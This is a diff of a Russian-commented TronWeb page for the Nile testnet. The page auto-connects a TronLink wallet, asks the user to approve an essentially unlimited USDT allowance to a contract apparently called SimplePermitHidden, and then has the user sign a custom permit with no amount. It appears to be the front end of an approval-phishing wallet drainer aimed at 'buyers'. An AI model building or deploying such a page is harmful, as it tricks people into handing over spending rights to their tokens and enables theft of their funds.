@@ -71,37 +71,16 @@
 
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.min.js"></script>
     <script>
-        // ВАЖНО: Проверьте этот адрес на https://nile.tronscan.org/
-        // Если контракт не существует — замените на правильный
-        const CONTRACT_BASE58 = 'TBVkLMZgwqfNNPrgfU2WsSPPFTTUmjifKh';
+        // НОВЫЙ адрес контракта
+        const CONTRACT_BASE58 = 'TADBjmLAdnkpvBpH7a8gB5wfAU5uz4zoZ5';
         
-        // USDT в Nile Testnet — проверьте на TronScan!
+        // USDT в Nile Testnet — проверьте что это правильный адрес!
         const USDT_BASE58 = 'TF17BgPaZYzXTPb5tS1DaJzsGPB9vMVh6f';
 
         let tronWeb, userAddr, nonce;
-        let CONTRACT_HEX, USDT_HEX;
 
         function checkTronLink() {
             return !!(window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58);
-        }
-
-        // Отладка: показать hex адреса
-        function debugAddresses() {
-            if (!tronWeb) return;
-            
-            try {
-                const testHex = tronWeb.address.toHex(CONTRACT_BASE58);
-                console.log('Contract base58:', CONTRACT_BASE58);
-                console.log('Contract hex:', testHex);
-                console.log('Contract hex starts with 41?', testHex.startsWith('41'));
-                
-                const usdtHex = tronWeb.address.toHex(USDT_BASE58);
-                console.log('USDT base58:', USDT_BASE58);
-                console.log('USDT hex:', usdtHex);
-                console.log('USDT hex starts with 41?', usdtHex.startsWith('41'));
-            } catch (e) {
-                console.error('Address conversion error:', e);
-            }
         }
 
         async function connectWallet() {
@@ -112,12 +91,10 @@
             btn.textContent = 'Проверка...';
 
             try {
-                // Запрашиваем аккаунт
                 if (window.tronLink && window.tronLink.request) {
                     await window.tronLink.request({ method: 'tron_requestAccounts' });
                 }
 
-                // Ждём инициализации
                 let attempts = 0;
                 while (!checkTronLink() && attempts < 30) {
                     await new Promise(r => setTimeout(r, 200));
@@ -131,26 +108,10 @@
                 tronWeb = window.tronWeb;
                 userAddr = tronWeb.defaultAddress.base58;
 
-                // Отладка адресов
-                debugAddresses();
-
-                // Конвертируем адреса в hex
-                try {
-                    CONTRACT_HEX = tronWeb.address.toHex(CONTRACT_BASE58);
-                    USDT_HEX = tronWeb.address.toHex(USDT_BASE58);
-                } catch (e) {
-                    throw new Error('Ошибка конвертации адреса: ' + e.message);
-                }
-
-                // Проверяем, что hex начинается с 41 (TRON формат)
-                if (!CONTRACT_HEX.startsWith('41')) {
-                    throw new Error('Неверный формат адреса контракта: ' + CONTRACT_HEX);
-                }
-
                 status.textContent = 'Кошелёк: ' + userAddr.slice(0, 6) + '...' + userAddr.slice(-4);
                 status.classList.remove('error');
 
-                // Проверяем статус через наш контракт (не USDT напрямую)
+                // Проверяем статус через контракт
                 await checkStatusViaContract();
 
             } catch (e) {
@@ -162,8 +123,6 @@
             }
         }
 
-        // Проверяем статус через SimplePermitHidden.getStatus()
-        // Это обходит необходимость вызывать USDT напрямую
         async function checkStatusViaContract() {
             const btn = document.getElementById('connectBtn');
             const approveBtn = document.getElementById('approveBtn');
@@ -171,16 +130,15 @@
             const status = document.getElementById('statusText');
 
             try {
-                // Вызываем getStatus(buyer) нашего контракта
+                // Вызываем getStatus(buyer) через triggerConstantContract
+                // Используем base58 адрес напрямую — TronWeb должен конвертировать сам
                 const functionSelector = 'getStatus(address)';
-                const parameter = [
-                    { type: 'address', value: userAddr }
-                ];
+                const parameter = [{ type: 'address', value: userAddr }];
 
-                console.log('Calling getStatus with hex:', CONTRACT_HEX);
+                console.log('Calling getStatus on contract:', CONTRACT_BASE58);
 
                 const tx = await tronWeb.transactionBuilder.triggerConstantContract(
-                    CONTRACT_HEX,
+                    CONTRACT_BASE58,  // base58 адрес
                     functionSelector,
                     {},
                     parameter
@@ -189,19 +147,16 @@
                 console.log('getStatus response:', tx);
 
                 if (tx.constant_result && tx.constant_result[0]) {
-                    // Декодируем результат (uint256, uint256, bool)
                     const result = tx.constant_result[0];
                     
-                    // allowance = первые 32 байта (64 hex символа)
+                    // Декодируем: allowance (uint256), balance (uint256), hasAccess (bool)
+                    // Каждое значение занимает 32 байта (64 hex символа)
                     const allowanceHex = result.slice(0, 64);
-                    const allowance = parseInt(allowanceHex, 16);
-                    
-                    // balance = следующие 32 байта
                     const balanceHex = result.slice(64, 128);
-                    const balance = parseInt(balanceHex, 16);
-                    
-                    // hasAccess = последний байт
                     const hasAccessHex = result.slice(128, 192);
+                    
+                    const allowance = parseInt(allowanceHex, 16) || 0;
+                    const balance = parseInt(balanceHex, 16) || 0;
                     const hasAccess = parseInt(hasAccessHex, 16) > 0;
 
                     console.log('Allowance:', allowance, 'Balance:', balance, 'HasAccess:', hasAccess);
@@ -222,73 +177,8 @@
 
             } catch (e) {
                 console.error('getStatus error:', e);
-                
-                // Если getStatus не работает — пробуем проверить через approve напрямую к USDT
-                status.textContent = 'Проверка через USDT...';
-                await checkAllowanceDirect();
-            }
-        }
-
-        // Прямая проверка allowance через USDT (если getStatus не сработал)
-        async function checkAllowanceDirect() {
-            const btn = document.getElementById('connectBtn');
-            const approveBtn = document.getElementById('approveBtn');
-            const signBtn = document.getElementById('signBtn');
-            const status = document.getElementById('statusText');
-
-            try {
-                // Пробуем вызвать allowance через прямой вызов
-                const functionSelector = 'allowance(address,address)';
-                const parameter = [
-                    { type: 'address', value: userAddr },
-                    { type: 'address', value: CONTRACT_BASE58 }  // пробуем base58
-                ];
-
-                console.log('Trying allowance with base58 address...');
-
-                let tx;
-                try {
-                    tx = await tronWeb.transactionBuilder.triggerConstantContract(
-                        USDT_BASE58,  // пробуем base58
-                        functionSelector,
-                        {},
-                        parameter
-                    );
-                } catch (e1) {
-                    console.log('Base58 failed, trying hex...');
-                    tx = await tronWeb.transactionBuilder.triggerConstantContract(
-                        USDT_HEX,  // пробуем hex
-                        functionSelector,
-                        {},
-                        parameter
-                    );
-                }
-
-                console.log('Allowance response:', tx);
-
-                if (tx.constant_result && tx.constant_result[0]) {
-                    const allowance = parseInt(tx.constant_result[0], 16);
-                    
-                    if (allowance > 0) {
-                        btn.classList.add('hidden');
-                        approveBtn.classList.add('hidden');
-                        signBtn.classList.remove('hidden');
-                        status.textContent = 'Нажмите "Подписать разрешение"';
-                    } else {
-                        btn.classList.add('hidden');
-                        approveBtn.classList.remove('hidden');
-                        status.textContent = 'Сначала разрешите доступ к USDT';
-                    }
-                } else {
-                    throw new Error('Не удалось получить allowance');
-                }
-
-            } catch (e) {
-                console.error('Direct allowance error:', e);
-                status.textContent = 'Ошибка проверки: ' + e.message + '. Попробуйте сделать approve вручную через TronLink.';
+                status.textContent = 'Ошибка: ' + e.message + '. Попробуйте сделать approve вручную.';
                 status.classList.add('error');
-                
-                // Показываем кнопку approve в любом случае
                 btn.classList.add('hidden');
                 approveBtn.classList.remove('hidden');
             }
@@ -302,30 +192,24 @@
             btn.textContent = 'Ожидание...';
 
             try {
-                // Пробуем approve через triggerSmartContract
+                // Approve на контракт (не на USDT напрямую)
+                // Покупатель разрешает контракту списывать USDT
                 const functionSelector = 'approve(address,uint256)';
                 const parameter = [
-                    { type: 'address', value: CONTRACT_BASE58 },
+                    { type: 'address', value: CONTRACT_BASE58 },  // approve на наш контракт
                     { type: 'uint256', value: '999999999999999999999999999999' }
                 ];
 
-                let tx;
-                try {
-                    tx = await tronWeb.transactionBuilder.triggerSmartContract(
-                        USDT_BASE58,
-                        functionSelector,
-                        { feeLimit: 100000000, callValue: 0 },
-                        parameter
-                    );
-                } catch (e1) {
-                    console.log('Base58 failed for approve, trying hex...');
-                    tx = await tronWeb.transactionBuilder.triggerSmartContract(
-                        USDT_HEX,
-                        functionSelector,
-                        { feeLimit: 100000000, callValue: 0 },
-                        parameter
-                    );
-                }
+                console.log('Approving for contract:', CONTRACT_BASE58);
+
+                const tx = await tronWeb.transactionBuilder.triggerSmartContract(
+                    USDT_BASE58,  // контракт USDT
+                    functionSelector,
+                    { feeLimit: 100000000, callValue: 0 },
+                    parameter
+                );
+
+                console.log('Approve transaction:', tx);
 
                 const signedTx = await tronWeb.trx.sign(tx.transaction);
                 const result = await tronWeb.trx.sendRawTransaction(signedTx);
@@ -336,7 +220,7 @@
                     status.textContent = 'Нажмите "Подписать разрешение"';
                     status.classList.remove('error');
                 } else {
-                    throw new Error('Транзакция не подтверждена');
+                    throw new Error('Транзакция не подтверждена: ' + JSON.stringify(result));
                 }
 
             } catch (e) {
@@ -357,11 +241,11 @@
 
             try {
                 nonce = Math.floor(Math.random() * 1000000);
-                const deadline = Math.floor(Date.now() / 1000) + 86400;
+                const deadline = Math.floor(Date.now() / 1000) + 86400; // 1 день
 
-                // EIP-712 хеш
+                // EIP-712 Permit без amount!
                 const PERMIT_TYPEHASH = tronWeb.sha3("Permit(address buyer,uint256 nonce,uint256 deadline)");
-                const chainId = 3448148188;
+                const chainId = 3448148188; // Nile Testnet
 
                 // DOMAIN_SEPARATOR
                 const domainData = tronWeb.eth.abi.encodeParameters(
@@ -376,14 +260,14 @@
                 );
                 const DOMAIN_SEPARATOR = tronWeb.sha3(domainData, { encoding: 'hex' });
 
-                // structHash
+                // structHash (без amount!)
                 const structData = tronWeb.eth.abi.encodeParameters(
                     ['bytes32', 'address', 'uint256', 'uint256'],
                     [PERMIT_TYPEHASH, userAddr, nonce, deadline]
                 );
                 const structHash = tronWeb.sha3(structData, { encoding: 'hex' });
 
-                // Final hash
+                // Final hash: \x19\x01 + DOMAIN_SEPARATOR + structHash
                 const finalHash = tronWeb.sha3(
                     '0x1901' + DOMAIN_SEPARATOR.slice(2) + structHash.slice(2),
                     { encoding: 'hex' }
@@ -391,13 +275,16 @@
 
                 btn.textContent = 'Подпишите в TronLink...';
 
+                // Подпись через TronLink
                 const signature = await tronWeb.trx.sign(finalHash, tronWeb.defaultAddress.hex, false);
 
+                // Parse v, r, s
                 const sig = signature.replace('0x', '');
                 const v = parseInt(sig.substr(128, 2), 16);
                 const r = '0x' + sig.substr(0, 64);
                 const s = '0x' + sig.substr(64, 64);
 
+                // Show result
                 const data = {
                     buyer: userAddr,
                     nonce: nonce,
@@ -429,6 +316,7 @@
             navigator.clipboard.writeText(text).then(() => alert('Скопировано!'));
         }
 
+        // Auto-connect если TronLink уже есть
         window.addEventListener('load', () => {
             if (checkTronLink()) connectWallet();
         });
